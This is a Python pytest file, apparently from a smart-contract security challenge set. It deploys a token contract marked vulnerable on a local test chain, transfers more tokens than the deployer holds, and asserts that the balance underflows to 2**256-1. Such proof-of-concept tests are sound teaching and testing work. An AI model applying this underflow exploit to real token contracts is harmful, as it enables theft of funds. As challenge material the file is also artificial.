import os

import pytest

from sc_test_utils import get_web3_instance, load_w3_contract


@pytest.fixture(scope="module")
def setup_module():
    file_name = os.path.basename(__file__)
    print(f": Setting up the module {file_name}")
    current_dir = os.path.dirname(__file__)
    parent_dir = os.path.dirname(current_dir)
    challenge_dir = file_name[5:-3]
    challenge_dir = os.path.join(parent_dir, challenge_dir)

    w3 = get_web3_instance()
    vulnerable_contract = load_w3_contract(challenge_dir, version='0.6.0', constructor_args=[20])
    yield w3, vulnerable_contract
    print(f"\nTearing down the module: {file_name}")


def test_exploit(setup_module):
    w3, vulnerable_contract = setup_module
    deployer = w3.eth.accounts[0]
    _to = w3.eth.accounts[-1]  # any random address, as it doesn't matter here
    old_tokens = vulnerable_contract.functions.balanceOf(deployer).call()
    assert old_tokens == 20
    tx = vulnerable_contract.functions.transfer(_to, 1 + old_tokens).transact({'from': deployer})
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    assert receipt.status == 1
    new_tokens = vulnerable_contract.functions.balanceOf(deployer).call()
    assert new_tokens > old_tokens
    assert new_tokens == 2 ** 256 - 1
    print(f"Tokens before exploit: {old_tokens} after exploit: {new_tokens}")
